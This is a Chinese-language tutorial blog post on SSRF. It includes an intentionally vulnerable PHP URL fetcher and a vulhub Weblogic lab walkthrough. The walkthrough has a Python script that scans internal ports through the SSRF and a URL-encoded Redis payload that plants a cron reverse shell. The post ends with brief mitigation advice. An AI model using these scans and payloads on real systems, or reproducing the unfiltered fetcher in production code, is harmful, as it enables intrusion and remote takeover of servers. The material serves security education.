---
layout: post
title:  "Server Side Request Forgery (SSRF)"
date:   2019-01-21 20:15:33 +0700
categories: [Web安全]
---

SSRF（Server-Side-Request-Forgery，服务端请求伪造）是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（因为请求由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。

## 0x00 漏洞原理

SSRF 的形成原理大多是由于服务端提供了从其他服务器应用获取资源数据的功能但是没有对目标地址做过滤与限制。例如，黑客操作服务端从用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。如果这个功能被恶意利用，那么利用这个存在缺陷的Web应用作为代理攻击远程和本地的服务器，即当作跳板机，可作为`ssrfsocks`代理

攻击图示

![SSRF]({{}site.url}/images/SSRF.png)

## 0x01 SSRF能干些什么？

可以越过防火墙进行攻击，直接有服务器发起攻击，平常服务器所处的内网我们是访问不了的。

![Snipaste_2019-01-17_16-28-37]({{}site.url}/images/Snipaste_2019-01-17_16-28-37.png)

主要的攻击方式：

* 对外网、服务器所在的内网、本地进行端口扫描，获取一些服务的`banner` 信息
* 攻击运行所在的内网或本地应用程序
* 对内网web应用进行指纹识别，识别企业内部的资产信息
* 攻击内外网的web应用，主要使用HTTP、GET请求就可以实现的攻击（比如Struts2、SQLi）
* 利用file协议读取本地文件等。

![Snipaste_2019-01-17_19-18-05]({{}site.url}/images/Snipaste_2019-01-17_19-18-05.png)

## 0x03 漏洞利用

### 简单测试代码

常见的后端代码实现，使用curl获取数据。

```php
<?php
function curl($url){
	$ch = curl_init(); //初始化curl组件
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_HEADER,0);
	curl_exec($ch); //执行请求url
	curl_close($ch);
}
$url = $_GET['url'];
curl($url);

?>
```

该代码实现的功能是获取GET参数URL，然后将URL的内容返回到网页上。我们将请求参数`url`改为`http://www.baidu.com`，执行后可以看到以下页面

![Snipaste_2019-01-17_21-12-36]({{}site.url}/images/Snipaste_2019-01-17_21-12-36.png)

如果将参数`url`为内网地址，则会泄露内网信息，将`url`改为`192.168.0.103:3306`（服务器的地址）页面返回

![Snipaste_2019-01-17_21-14-53]({{}site.url}/images/Snipaste_2019-01-17_21-14-53.png)

读取本地文件

![Snipaste_2019-01-17_21-15-46]({{}site.url}/images/Snipaste_2019-01-17_21-15-46.png)

### Weblogic SSRF漏洞

参考：<http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html>

使用镜像：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf

环境搭建：

```
docker-compose build
docker-compose up -d
```

运行完上面两条命令后，漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，访问后可以看到![Snipaste_2019-01-17_21-42-11]({{}site.url}/images/Snipaste_2019-01-17_21-42-11.png)

现在来进行内网端口扫描，使用脚本

```python
# -*- coding: utf-8 -*- 

import re
import sys
import time
import thread
import requests
def scan(ip_str):
  ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','6379','7001','8000',)
  for port in ports:
    exp_url = "http://192.168.244.170:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://%s:%s"%(ip_str,port)
    try:
      response = requests.get(exp_url, timeout=15, verify=False)
      #SSRF判断
      re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
      #丢失连接.端口连接不上
      re_sult2 = re.findall('but could not connect',response.content)
      if len(re_sult1)!=0 and len(re_sult2)==0:
        print ip_str+':'+port
    except Exception, e:
      pass
def find_ip(ip_prefix):
  '''
  给出当前的192.168.1 ，然后扫描整个段所有地址
  '''
  for i in range(1,256):
    ip = '%s.%s'%(ip_prefix,i)
    thread.start_new_thread(scan, (ip,))
    time.sleep(3)
    
if __name__ == "__main__":
  commandargs = sys.argv[1:]
  args = "".join(commandargs)
  ip_prefix = '.'.join(args.split('.')[:-1])
  find_ip(ip_prefix)
```

注意上面的`exp_url` 要修改为自己的服务器IP

![Snipaste_2019-01-17_21-45-25]({{}site.url}/images/Snipaste_2019-01-17_21-45-25.png)

`172.17.0.1`  是docker里面的地址，也就是内网地址

通过ssrf 探测到内网中redis服务器 ‘172.17.0.2:6379’正常访问

构造脚本写入 目录`‘/etc/crontab‘`

```
​```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
​```
```

进行`url`编码：

~~~url
```
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```
~~~

最后反弹shell成功

## 0x04 漏洞挖掘

![1707150408d39c5b2dcf5e1a20]({{site.url}}/images/1707150408d39c5b2dcf5e1a20.jpg)

## 0x05 漏洞修复

* 限制请求的端口只能为web服务端口，只允许访问HTTP和HTTPS的请求
* 限制不能访问内网IP，以防止对内网进行攻击
* 屏蔽返回的详细信息

